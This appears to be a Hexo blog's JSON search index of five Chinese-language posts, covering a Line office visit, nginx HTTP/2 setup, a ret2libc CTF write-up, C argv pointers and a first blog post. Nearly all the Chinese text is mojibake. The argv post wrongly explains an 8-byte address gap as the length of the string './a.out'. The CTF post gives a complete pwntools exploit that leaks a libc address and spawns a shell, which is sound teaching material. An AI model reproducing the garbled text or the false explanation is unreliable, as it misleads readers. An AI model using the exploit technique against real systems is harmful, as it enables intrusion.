å…¥çœ¼ç°¾çš„æ˜¯ç°¡ç´„çš„ Line å­—æ¨£ï¼Œç§€åœ¨è¾¦å…¬å®¤çš„æ¯›ç»ç’ƒä¸Šé¢ã€‚ç•¶æ™‚ä»¥ç‚ºè½éŒ¯äº†ï¼Œå…¶å¯¦æ˜¯è¦åˆ° 4 æ¨“ã€‚å¾Œä¾†ç™¼ç¾åŸä¾† 4 ~ 10 æ¨“é€šé€šéƒ½æ˜¯ Line çš„ç¸½éƒ¨ï¼Œå·®åˆ¥åœ¨æ–¼ä¸åŒéƒ¨é–€è€Œå·²ã€‚\n\né™¤äº†ä»‹ç´¹ Line çš„å…¬å¸ç†å¿µå¤–ï¼Œå…¨çƒè³‡å®‰çš„é«˜éšä¸»ç®¡([@beist](https://twitter.com/beist))ä¹Ÿåœ¨ç¾å ´èˆ‡æˆ‘å€‘ä¸€èµ·äº¤æµï¼ŒDavid ä»‹ç´¹èªª Beist æ˜¯å…¨äºæ´²ç¬¬ä¸€ä½æ‰“é€² Defcon çš„ CTF ç©å®¶ã€‚è½åˆ°é€™é‚Šçœ¼ç›éƒ½äº®äº†ï¼Œç¬¬ä¸€æ¬¡èˆ‡é€™ç¨®ç­‰ç´šçš„äººç‰©è¿‘è·é›¢äº¤æµã€‚é›–ç„¶ Beist æ˜¯é«˜éšä¸»ç®¡ï¼Œä½†æ˜¯çœ‹èµ·ä¾†å¹´ç´€å¾ˆè¼•ï¼Œèˆ‡æˆ‘å€‘è«‡è©±å°±åƒæœ‹å‹ä¸€èˆ¬ï¼Œå®Œå…¨æ²’æœ‰å£“åŠ›ã€‚\n\nDavid ä¹Ÿä»‹ç´¹äº† [becks.io](https://becks.io/) é€™æ¨£çš„æ´»å‹•ï¼Œå¯ä»¥ä¸€èµ·äº¤æµæŠ€è¡“ï¼Œä¸€é‚Šäº«ç”¨ç¾é£Ÿï¼Œé€™ä¹Ÿç®—æ˜¯ Line çš„æ–‡åŒ–ä¹‹ä¸€ã€‚å…¶ä¸­æœ‰ä»‹ç´¹åˆ° Line çš„è³‡å®‰åœ˜éšŠæœ‰å„åœ‹ä¸åŒçš„æˆå“¡ï¼Œæ‰€ä»¥åœ¨æ”¶ email çš„æ™‚å€™ï¼Œå¸¸å¸¸æœƒæœ‰ 4 åœ‹èªè¨€(è‹±æ–‡ã€éŸ“æ–‡ã€æ—¥æ–‡ã€ä¸­æ–‡)ï¼Œéå¸¸æœ‰è¶£ã€‚è€Œä¸” Line ä¹Ÿé¼“å‹µå“¡å·¥ç™¼å±•è‡ªå·±æœ‰èˆˆè¶£çš„æŠ€è¡“ï¼Œä¸ä¸€å®šè¦èˆ‡å·¥ä½œæœ‰ç›´æ¥é—œä¿‚ï¼Œå¯ä»¥ç ”ç©¶è‡ªå·±æœ‰èˆˆè¶£çš„è³‡å®‰è­°é¡Œã€‚\n\n{% asset_img line_02.JPG %}\n![1](line_02.JPG)\n\nå·¥ä½œç’°å¢ƒé™¤äº†æœ‰å¾ˆå¤šçš„é–‹æ”¾ç©ºé–“å¤–ï¼Œæœ‰äº›åœ°æ–¹é‚„æœ‰æä¾›å‡é™æ¡Œã€‚è®“å·¥ç¨‹å¸«æœ‰æ™‚å€™åä¹…äº†ä¹Ÿèƒ½ç«™è‘— codingï¼Œè½‰æ›å§¿å‹¢ã€‚ä¹Ÿæœ‰å’–å•¡ bar æä¾›å“¡å·¥å¯ä»¥é»å’–å•¡æˆ–é£²å“ä¾†å–ã€‚å·¥ç¨‹å¸«ä¹Ÿæ²’æœ‰å›ºå®šåä½ï¼Œæƒ³è¦åœ¨å“ªé‚Š coding éƒ½å¯ä»¥ï¼Œè‡ªå·±é–‹å¿ƒèˆ’æœå°±å¥½ï¼Œå€‹äººéå¸¸å–œæ­¡é€™ç¨®æ„Ÿè¦ºã€‚\n\nLine åœ¨è¿‘æœŸä¹Ÿæä¾›äº†å¾ˆå¤šå¯¦ç¿’æ©Ÿæœƒï¼ŒDavid é¼“å‹µå¤§å®¶ä¸ç”¨æ€•è‡ªå·±é‚„æ²’ç•¢æ¥­æˆ–æ˜¯è¦ç•¶å…µä¸èƒ½å¯¦ç¿’ (Beist åæ§½èªªéŸ“åœ‹ç•¶å…µè¦ 4 å¹´ï¼Œå°ç£ 4 å€‹æœˆæ ¹æœ¬ä¸å«ç•¶å…µ ğŸ˜‚)ã€‚Line é¡˜æ„èŠ±æ™‚é–“ç­‰ï¼Œæœ‰å“¡å·¥æ‹¿åˆ° offer 13 å€‹æœˆå¾Œæ‰èƒ½ä¸Šç­ï¼ŒLine æ­£åœ¨ç­‰å¾…ä¸­ã€‚é¢è©¦çš„è©±è¼ƒä¸€èˆ¬å…¬å¸åš´æ ¼è¨±å¤šï¼Œæœ‰äº”é“é—œå¡ï¼Œé¡ä¼¼ googleã€‚\n\næœ€å¾Œé™ªåŒæˆ‘å€‘çš„å¦å¤–ä¸€ä½å·¥ç¨‹å¸«æ‹¿äº†åç‰‡çµ¦æˆ‘å€‘ï¼Œä¸Šé¢å¯«è‘— [Evan Lin](http://www.evanlin.com/)ã€‚è¦ºå¾—éå¸¸çœ¼ç†Ÿï¼Œæ–¼æ˜¯é¦¬ä¸ŠæŸ¥äº†ä¸€ä¸‹ï¼Œç™¼ç¾æ˜¯ä¸€ä½è‡ªå·±è¿½è¹¤éå¸¸ä¹…å·¥ç¨‹å¸«ï¼ŒåŒæ™‚ä¹Ÿæ˜¯ [golangtw](https://github.com/golangtw) çš„æˆå“¡ã€‚ä¹‹å‰çœ‹äº†éå¸¸å¤šä»–å¯«çš„æ–‡ç« ï¼Œæ­¤æ™‚æ‰ç™¼ç¾åŸä¾†ä»–å°±åœ¨ Line ä»»è·ã€‚\n\næ•´é«”ä¾†èªª Line æ˜¯ä¸€é–“éå¸¸æœ‰å‰µé€ åŠ›ï¼Œä¸”å¹´è¼•æ´»æ½‘çš„å…¬å¸ã€‚ç„¡è«–æ˜¯å·¥ä½œç’°å¢ƒæˆ–æ˜¯å·¥ä½œæ°›åœä»¥åŠä¼æ¥­ç†å¿µéƒ½éå¸¸å¸å¼•äººã€‚\n","tags":["å€‹äºº"]},{"title":"åœ¨ubuntuä¸Šå°‡nginxå‡ç´šè‡³http/2","url":"/2019/03/06/","content":"\n## å‰è¨€\n\næ¶è¨­ web server æ™‚ï¼ŒæŠŠåŸºæœ¬è¨­å®š(virtual host)è¨­å®šå®Œä¹‹å¤–ï¼Œæœ€éº»ç…©çš„ä¸€ä»¶äº‹æƒ…å°±æ˜¯è¨­å®šæ†‘è­‰ã€‚å› ç‚ºæ†‘è­‰æœ‰æœŸé™ï¼Œé™¤äº†ç”³è«‹æ†‘è­‰å¤–é‚„è¦æ’ç¨‹å»å®šæœŸæ›´æ–°ï¼Œå¦å‰‡è‡ªå·±å¿˜è¨˜æ†‘è­‰åˆ°æœŸçš„è©±ï¼ŒæŸä¸€å¤©ç¶²ç«™å°±ç„¡æ³•è¢«æ­£å¸¸å­˜å–äº†\n\nç¾åœ¨ cloudflare æœ‰æä¾›å…è²» SSL æœå‹™ï¼Œåªéœ€è¦æŒ‰å¹¾å€‹æŒ‰éµå°±æå®šäº†ã€‚ä½† SSL ç•¢ç«Ÿæ˜¯ server side çš„äº‹æƒ…ï¼Œçµ¦ cloudflare å¹«ä½ åšï¼Œé‚„è¦é–‹å•Ÿ CDN ï¼Œå¦‚æœåªæ˜¯éœæ…‹ç¶²é çš„è©±æ²’å•é¡Œã€‚éœ€è¦ç”¨ reverse proxy çš„è©±ï¼ŒCDNåè€Œæ˜¯å¹«å€’å¿™ï¼Œæ‰€ä»¥é‚„æ˜¯éè‡ªå·±è¨­å®šä¸å¯\n\næ–¼æ˜¯æƒ³èªªè¶æ›´æ–°æ›´æ–°æ†‘è­‰ï¼Œé †ä¾¿å¹« nginx ä¹Ÿæ”¹èµ° http/2\n\n## æ­£æ–‡\n\nhttp/2 çš„å„ªé»åœ¨æ­¤ä¸è´…è¿°ï¼Œè¦å°‡ nginx å•Ÿå‹• http2ï¼Œé¦–å…ˆè¦ç¢ºèªä½ çš„ nginx ç‰ˆæœ¬æ˜¯å¦å¤§æ–¼ `1.9.5`\n\n> $ nginx -v\n> nginx version: nginx/1.14.2\n\næ¥ä¸‹ä¾†å› ç‚º http/2 å¼·åˆ¶è¦ç”¨ SSLï¼Œæ‰€ä»¥å¿…é ˆè¦ç”³è«‹æ†‘è­‰\n\næ¨è–¦ç”¨ `Let's encrypt` ä¸¦ä¸”ç”¨ `certbot` ç®¡ç†ï¼ŒåŸå› æ˜¯ certbot åœ¨ç‰ˆæœ¬ 0.22 ä»¥ä¸Šå¯ä»¥ç°½ç™¼ wildcard æ†‘è­‰ï¼Œå¦‚æ­¤ä¸€ä¾†å°±ä¸éœ€è¦åƒä»¥å‰ä¸€æ¨£ï¼Œå¹«è‡ªå·±çš„æ¯ä¸€å€‹ sub domain éƒ½ç”³è«‹ä¸€å€‹æ†‘è­‰\n\næ„æ€å°±æ˜¯ä¸€å¼µæ†‘è­‰å¯ä»¥åœ¨ `*.your-domain` ä¸‹ä½¿ç”¨\n\n## é–‹å·¥\n\nå¦‚æœä½ å¸Œæœ›ç”³è«‹æ†‘è­‰çš„åŒæ™‚å¹«ä½ è¨­å®šä½ çš„ nginx è¨­å®šæª”ï¼Œå¯ä»¥é€™éº¼åš\n\n(é è¨­æ˜¯å¹«ä½ ç”³è«‹ `/etc/nginx/sites-enabled` ä¸‹çš„ domain)\n\n`sudo certbot --nginx`\n\næˆ–æ˜¯ï¼Œåªéœ€è¦ç°½ç™¼æ†‘è­‰ï¼Œå…¶ä»–è‡ªå·±è¨­å®šå°±å¥½\n\n`sudo certbot --nginx certonly`\n\næ†‘è­‰è¨­å®šå¥½ï¼Œä¹Ÿç¢ºå®š nginx ç‰ˆæœ¬æ²’å•é¡Œï¼Œåªéœ€è¦å» nginx è¨­å®šæª”å•Ÿç”¨ http/2 å³å¯\n\n```\nlisten              443 ssl http2;\nlisten              [::]:443 ssl http2;\n```\n\nå¦å¤–ï¼Œä¸ç”¨æ“”å¿ƒæ†‘è­‰éæœŸçš„å•é¡Œï¼Œcertbot æœƒè‡ªå‹•å®šæœŸå°‡æ†‘è­‰æ›´æ–°\n\næƒ³ç¢ºèªçš„è©±ï¼Œä»¥ä¸‹æŒ‡ä»¤æŸ¥çœ‹ certbot æ˜¯å¦è¢«æ’ç¨‹\n\n`systemctl list-timers | grep certbot`\n\næ€•æ›´æ–°æœƒæœ‰å•é¡Œä¹Ÿå¯ä»¥è‡ªå·±å…ˆç¢ºèªæ˜¯å¦å¯ä»¥æ­£å¸¸æ›´æ–°æ†‘è­‰\n\n`sudo certbot renew --dry-run`\n\næ‹¿æ‰ `--dry-run` å³å¯æ‰‹å‹•æ›´æ–°\n\n`sudo certbot renew`\n\n## é©—è­‰\n\nè¦æª¢æŸ¥æ˜¯å¦æˆåŠŸå•Ÿç”¨ï¼Œå¯ä»¥ç”¨ç·šä¸Šå·¥å…·ï¼Œåƒæ˜¯ [http2-test](https://tools.keycdn.com/http2-test)\n\næˆ–è€…ç”¨ curl æŸ¥çœ‹å›æ‡‰æª”é ­æ˜¯å¦æˆåŠŸå•Ÿç”¨ http/2\n\n`curl -I your-domain`\n","tags":["nginx","linux","http2"]},{"title":"buffer overflowæ­é…ret2libcä¹‹æ”»æ“Šæ‰‹æ³•ä»‹ç´¹","url":"/2019/03/02/","content":"\n## å‰è¨€\n\nbuffer overflow ä»¥ä¸‹ç°¡ç¨±ç‚º BOFã€‚\n\nBOF æ˜¯ä¸€å€‹å¸¸è¦‹çš„æ”»æ“Šæ‰‹æ³•ï¼Œé€é BOF å¯ä»¥é”æˆå„ç¨®ä¸åŒçš„ç›®çš„ï¼Œåƒæ˜¯ï¼š\n\n- ret2text\n- ret2shellcode\n- ret2syscall\n- ret2libc\n\næœ¬æ–‡å°‡é€é 2018-EOF çš„ pwn3 ä¾†èªªæ˜ ret2libc çš„æ”»æ“Šæ‰‹æ³•\n\n## åˆ†æé¡Œç›®\n\n(é¡Œç›®çµ¦äº†ä¸€å€‹ ELF æª”æ¡ˆ ä»¥åŠ libc.so.6)\n\næ‹¿åˆ°é¡Œç›®ç¬¬ä¸€æ­¥ï¼Œå…ˆä¸Ÿåˆ° IDA ä¸­é€†å‘\n\n<!-- {% asset_img IDA-F5.png %} -->\n![1](IDA-F5.png)\n\nåŒæ™‚æŸ¥çœ‹ ELF æª”æ¡ˆçš„ä¿è­·ç‹€æ…‹\n\n<!-- {% asset_img checksec.png %} -->\n![2](checksec.png)\n\né€™å…©å€‹ç·šç´¢åŠ èµ·ä¾†(æ²’æœ‰ canary, ä½¿ç”¨ read å‡½æ•¸)ï¼Œç¬¬ä¸€å€‹æƒ³åˆ°çš„å°±æ˜¯ BOF\n\nä½†æ˜¯ç¨‹å¼ä¸­ä¸¦æ²’æœ‰ç¾æˆçš„ function å¯ä»¥ç”¨ï¼Œæˆ‘å€‘çš„ç›®çš„æ˜¯ get shell\n\nç„¶è€Œåœ¨é¡Œç›®çµ¦çš„ libc.so.6 ä¸­ï¼Œç™¼ç¾äº† execve\n\n<!-- {% asset_img one_gadget.png %} -->\n![3](one_gadget.png)\n## å›°é›£é»\n\næˆ‘å€‘ä¸¦ä¸çŸ¥é“ libc.so.6 load é€² memory ä¹‹å¾Œçš„è¨˜æ†¶é«”ä½ç½®æ˜¯å¤šå°‘ï¼ŒåªçŸ¥é“ execve ç›¸å°æ–¼ libc.so.6 çš„ offset æ˜¯å¤šå°‘ (0xf1147)\n\nä½†æ˜¯ç¨‹å¼ä¸­æœ‰ä¸€å€‹ puts å‡½æ•¸ï¼Œå¦‚æœæˆ‘å€‘èƒ½åˆ©ç”¨ä»–ä¾†å°å‡º GOT çš„ main ä½ç½®ä¸¦ä¸”èˆ‡ binary è£¡é¢çš„ main ä½ç½®ç›¸æ¸›ï¼Œå°±çŸ¥é“æ•´å€‹å‡½å¼åº«è¼‰å…¥åˆ° memory çš„å“ªå€‹ä½ç½®äº†\n\n## payload\n\nå…ˆå‚™çŸ¥è­˜ï¼š\n\n> Linux x86-64 ä¸‹çš„ calling convention\n\nåƒæ•¸å°‘æ–¼ 7ï¼Œåƒæ•¸å¾å·¦åˆ°å³æ”¾å…¥æš«å­˜å™¨é †åºç‚º: rdi, rsi, rdx, rcx, r8, r9\n\n```python\npayload = flat([\n                offset, # é€é read è“‹ä¸€å † 'a' ç›´åˆ° ret addr\n                pop_rdi_ret, # è¨­å®š puts çš„åƒæ•¸ï¼Œåªæœ‰ä¸€å€‹ï¼Œæ‰€ä»¥åˆ©ç”¨ pop_rdi å³å¯\n                elf.got['__libc_start_main'], # puts çš„åƒæ•¸ 1\n                elf.plt['puts'], # åŸ·è¡Œ puts\n                elf.symbols['main'] # åŸ·è¡Œå®Œ puts é‡æ–°åŸ·è¡Œ main\n                ])\n```\n\nå¦‚æ­¤ä¸€ä¾†ç¨‹å¼çš„æµç¨‹å°±æœƒè®Šæˆï¼Œå°å‡º `elf.got['__libc_start_main']` ä¸¦ä¸”é‡æ–°åŸ·è¡Œ main\n\næ¥è‘—åªéœ€è¦æŠŠå°å‡ºçš„è¨˜æ†¶é«”ä½ç½®ç”¨ u64 æ‰“åŒ…ä¸¦ä¸”æ¸›å» main åœ¨ç¨‹å¼ä¸­æœªè¼‰å…¥æ™‚çš„ä½ç½®å°±å¯ä»¥å¾—çŸ¥ load åˆ° memory ä¸­çš„ä½ç§»\n\næŠŠä½ç§»å†åŠ ä¸Šç”¨ one_gadget æ‰¾åˆ°çš„ execve å°±å¤§å·¥å‘Šæˆäº†!\n\n```python\npayload2 = flat([\n                offset,\n                u64(r.recv(6)+'\\x00\\x00') - libc.symbols['__libc_start_main'] + one_gadget\n])\n```\n\nä»¥ä¸‹æ˜¯å®Œæ•´ payload\n\n```python\nfrom pwn import *\n\nelf = ELF('./pwn3')\n#libc = ELF('libc.so.6') #é¡Œç›®çµ¦çš„\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #æœ¬åœ°æ¸¬è©¦\n\ncontext(arch = 'amd64',log_level='debug')\nr = process('./pwn3')\n\noffset = 'a'*0x10\npop_rdi_ret = 0x4006d3\none_gadget = 0xf1147\n\npayload = flat([\n                offset,\n                pop_rdi_ret,\n                elf.got['__libc_start_main'],\n                elf.plt['puts'],\n                elf.symbols['main']\n                ])\nr.sendline(payload)\nr.recvline()\n\npayload2 = flat([\n                offset,\n                u64(r.recv(6)+'\\x00\\x00') - libc.symbols['__libc_start_main'] + one_gadget\n                ])\n\nr.sendline(payload2)\nr.interactive()\n```\n","tags":["è³‡è¨Šå®‰å…¨","ctf"]},{"title":"å¦‚ä½•çœ‹å¾…Cèªè¨€çš„argvèˆ‡æŒ‡æ¨™é—œä¿‚","url":"/2019/03/01/","content":"\n## å‰è¨€\n\nåœ¨ä¸€æ¬¡ä½œæ¥­ä¸‹ç¢°åˆ°äº† argv èˆ‡çš„æ“ä½œï¼Œçœ‹åˆ°èª²æœ¬\n\n> UNIX Systems Programming: Communication, Concurrency and Threads: Communication, Concurrency and Threads (2nd Edition) 2nd Edition\n\nå°æ–¼ argv çš„æ“ä½œç‚ºä¸‹\n\n```c\nint main(int argc, char* argv[]) { }\n```\n\nå›æƒ³èµ·ä»¥å‰å¸¸å¸¸éƒ½æ˜¯ä½¿ç”¨ä»¥ä¸‹é€™ç¨®ç”¨æ³•\n\n```c\nint main(int argc, char** argv) { }\n```\n\næ–¼æ˜¯é–‹å§‹ç ”ç©¶äº† C èªè¨€çš„ argv åˆ°åº•å‚³äº†ä»€éº¼æ±è¥¿çµ¦ main function\n\n## æ­£æ–‡\n\nåœ¨è¨˜æ†¶é«”ä¸­ argv æ˜¯ä¸€å€‹æŒ‡æ¨™ï¼ŒæŒ‡å‘ char é™£åˆ—ï¼Œæ¯ä¸€é™£åˆ—çš„å…§å®¹å°±æ˜¯ä¸åŒçš„ argv å­—ä¸²ï¼Œå¦‚ä¸‹åœ–æ‰€ç¤ºã€‚\n\n<!-- {% asset_img argv_in_mem.png %} -->\n![1](argv_in_mem.png)\n\n> åœ–ç‰‡ä¾†æº (https://softwareengineering.stackexchange.com/questions/385819/why-is-c-c-main-argv-declared-as-char-argv-rather-than-just-char-argv)\n\næ‰€ä»¥ç•¶ main åœ¨æ¥æ”¶ argv é€™å€‹æŒ‡æ¨™æ™‚ï¼Œå®ƒåªæ˜¯ä¸€å€‹æŒ‡å‘å­—å…ƒé™£åˆ—çš„æŒ‡æ¨™ï¼Œéœ€è¦å°å®ƒé€²ä¸€æ­¥æ“ä½œï¼Œä¾‹å¦‚ï¼š\n\n```c\n#include <stdio.h>\nint main(int argc, char* argv[]) {\n    printf(\"%s\\n\", argv[0]);  // argvæŒ‡å‘é™£åˆ—ä¸­çš„ç¬¬0æ ¼çš„å€¼\n    printf(\"%p\\n\", &argv[0]); // argvæŒ‡å‘é™£åˆ—ä¸­çš„ç¬¬0æ ¼çš„ä½ç½®\n    printf(\"%p\\n\", &argv[1]); // argvæŒ‡å‘é™£åˆ—ä¸­çš„ç¬¬1æ ¼çš„ä½ç½®\n    printf(\"%p\\n\", argv);     // argvæŒ‡æ¨™æœ¬èº«å­˜çš„å€¼\n    printf(\"%p\\n\", &argv);    // argvæŒ‡æ¨™æœ¬èº«çš„ä½ç½®\n}\n```\n\nç·¨è­¯:\n`gcc app.c`\n\noutput:\n\n```\n./a.out\n0x7fffffffe5b8\n0x7fffffffe5c0\n0x7fffffffe5b8\n0x7fffffffe4c0\n```\n\næŠŠçµæœå°å°è‡³ä¸Šåœ–ï¼Œå¦‚åŒä»¥ä¸‹ï¼š\n<!-- {% asset_img proof.png %} -->\n![2](./proof.png)\n\nå¦‚æœå°‡é™£åˆ—çš„ç¬¬äºŒæ ¼ä½ç½®èˆ‡ç¬¬ä¸€æ ¼ç›¸æ¸›ï¼Œå¯ä»¥ç™¼ç¾é•·åº¦ç‚º 8\n\n`0x7fffffffe5c0 - 0x7fffffffe5b8 = 8`\n\nè€Œé€™å€‹ 8 å°±æ˜¯ `./a.out` é€™å€‹å­—ä¸²çš„é•·åº¦ (`.`, `/`, `a`, `.`, `o`, `u`, `t`, `\\0`)\n\n## çµè«–\n\nå¦‚æ­¤ä¸€ä¾†ï¼Œå…©ç¨®å¯«æ³•çš„é—œä¿‚å°±æ¸…æ™°å¤šäº†ã€‚\n\n```c\nint main(int argc, char** argv) { }\n```\n\né€™å€‹å¯«æ³•åªä¸éæ˜¯ pointer to pointer çš„æ¦‚å¿µï¼Œèˆ‡å¦å¤–ä¸€ç¨®å¯ä»¥èªªæ˜¯æ²’æœ‰åˆ†åˆ¥ã€‚\n\nä¸ç›¸ä¿¡çš„è©±å¯ä»¥åšå€‹å°å¯¦é©—ï¼š\n\n```c\n#include <stdio.h>\nint main(int argc, char** argv) {\n    printf(\"%s\\n\", argv[0]);\n    printf(\"%p\\n\", &argv[0]);\n    printf(\"%p\\n\", &argv[1]);\n    printf(\"%p\\n\", argv);\n    printf(\"%p\\n\", &argv);\n}\n```\n\nç·¨è­¯:\n`gcc app2.c`\n\noutput:\n\n```\n./a.out\n0x7fffffffe5b8\n0x7fffffffe5c0\n0x7fffffffe5b8\n0x7fffffffe4c0\n```\n\nèˆ‡ä¸Šè¿°ç¬¬ä¸€ç¨®å¯«æ³•å®Œå…¨ç›¸åŒï¼\n\n(å¯¦éš›ä¸Š OS æœ‰ä¸€ç¨® [ASLR](https://zh.wikipedia.org/wiki/%E4%BD%8D%E5%9D%80%E7%A9%BA%E9%96%93%E9%85%8D%E7%BD%AE%E9%9A%A8%E6%A9%9F%E8%BC%89%E5%85%A5) çš„æ©Ÿåˆ¶è®“æ¯ä¸€æ¬¡åŸ·è¡Œç¨‹å¼çš„ virtual memory éƒ½ä¸åŒï¼Œæ‰€ä»¥åšé€™å€‹å¯¦é©—æ™‚ï¼Œè¨˜å¾—å…ˆæš«æ™‚é—œé–‰ ASLRã€‚)\n\næ‰€ä»¥ä¾ç…§å€‹äººç¿’æ…£ï¼Œæƒ³è¦ç”¨å“ªä¸€ç¨®å¯«æ³•éƒ½å¯ä»¥ ğŸ‘\n","tags":["linux","c"]},{"title":"ç‚ºä½•æˆ‘é¸æ“‡hexoç•¶ä½œå€‹äººblog?","url":"/2019/02/26/","content":"\n## å‰è¨€\n\nåœ¨ç¶²è·¯ä¸Šçˆ¬æ–‡å­¸ç¿’çš„éç¨‹ä¸­ï¼Œç™¼ç¾æœ‰å¾ˆå¤šäººå°‡æŠ€è¡“æ–‡ç« æˆ–æ˜¯æ•™å­¸æ–‡ç« éƒ½æ”¾åœ¨è‡ªå·±æ¶è¨­çš„éƒ¨è½æ ¼ä¸­ã€‚è‹¥ä¸æ˜¯æ”¾åœ¨è‡ªå·±çš„éƒ¨è½æ ¼ä¸­ï¼Œå¤šåŠæ˜¯é¸æ“‡ Medium ã€‚\n\næˆ‘ä¹Ÿæœ‰è€ƒæ…®é `wordpress`, `Medium`\n\næœ€å¾Œæ±ºå®šä½¿ç”¨ `hexo` ä¾†æ¶è¨­éœæ…‹ç¶²ç«™ã€‚\n\n## æ­£æ–‡\n\né€™ç¯‡æ–‡ç« ç•¶ä½œéƒ¨è½æ ¼çš„ç¬¬ä¸€ç¯‡æ–‡ç« åœ¨é©åˆä¸éäº†ã€‚\n\né¸æ“‡ hexo æœ‰å¹¾å€‹åŸå› ã€‚\n\n1. æ»¿è¶³è‡ªå·±ç®¡ç†ç¶²ç«™çš„æ…¾æœ›ã€‚ (æœ‰è‡ªå·±çš„ domain name å°±æ˜¯é–‹å¿ƒï¼Œæœ‰ç¨®ä¸€åˆ‡éƒ½æ˜¯è‡ªå·±æŒç®¡çš„æ„Ÿè¦º)\n2. ç›¸è¼ƒæ–¼ wordpress å¯ä»¥æ›´åŠ å®¹æ˜“éƒ¨ç½²èˆ‡è½‰ç§»ç’°å¢ƒ\n3. ä»¥é˜²è‡ªå·±çš„ VPS ä¸»æ©Ÿæœ‰ä»€éº¼ä¸‰é•·å…©çŸ­ï¼Œé‚„å¯ä»¥éƒ¨ç½²åœ¨ github ä¸Š\n4. markdown èªæ³•çš„æ”¯æ´ã€‚å·²ç¶“ç¿’æ…£ markdown äº†ï¼Œå¯¦åœ¨ä¸å¤ªæƒ³èŠ±å¿ƒæ€å»å­¸å…¶ä»–ç¨®èªæ³•(é›–ç„¶ä¹Ÿæœ‰çœ‹åˆ°äººå®¶èªª Medium çš„èªæ³•å¾ˆå¥½ä¸Šæ‰‹ï¼Œä½†æˆ‘å°±æ˜¯æ‡¶)\n\nå¾æˆ‘æ±ºå®šè¦ä½¿ç”¨ hexo åˆ°çœŸæ­£éƒ¨ç½²ä¸Šç·šèŠ±çš„æ™‚é–“ç´„è«ä¸åˆ°ä¸€å°æ™‚ï¼Œå…¶ä¸­æœ‰æ¯”è¼ƒå¤šçš„æ™‚é–“æ˜¯åœ¨çœ‹ä¸»é¡Œçš„è¨­å®šæª”ï¼Œä¿®æ”¹ä¸€äº›è¨­å®šã€‚\n\n## å¿ƒå¾—\n\nåŸºæœ¬ä¸Š hexo-cli å°±èƒ½å®Œæˆå¤§éƒ¨åˆ†çš„äº‹æƒ…ï¼Œå¾å»ºç«‹å®Œæ–‡ç« æ¨¡æ¿ï¼Œæ‰“é–‹ç·¨è¼¯å™¨ç·¨è¼¯æ–‡ç« ï¼Œç”¢ç”Ÿéœæ…‹æª”æ¡ˆï¼Œéƒ¨ç½²ã€‚\n\nå°æ–¼å¸¸å¸¸æ¥è§¸ cli çš„äººä¾†èªªå®Œå…¨ä¸æˆå•é¡Œï¼Œä½¿ç”¨ç¬¬ä¸€å¤©çš„å¿ƒå¾—é‚„ç®—æ»¿æ„ã€‚\n\nä¹‹å¾Œæ²’æ„å¤–çš„è©±é™¤äº†éƒ¨ç½²åœ¨ github.io ä»¥å¤–ï¼Œä¹Ÿéƒ¨ç½²åœ¨è‡ªå·±çš„ä¸»æ©Ÿä¸Šã€‚\n\n<!-- {% asset_img hexo.png %} -->\n![1](hexo.png)\n\nè£œä¸Šä¸€å¼µè¢å¹•æˆªåœ–ï¼ŒçµæŸç¬¬ä¸€ç¯‡æ–‡ç«  ğŸ˜„\n","tags":["å€‹äºº"]}]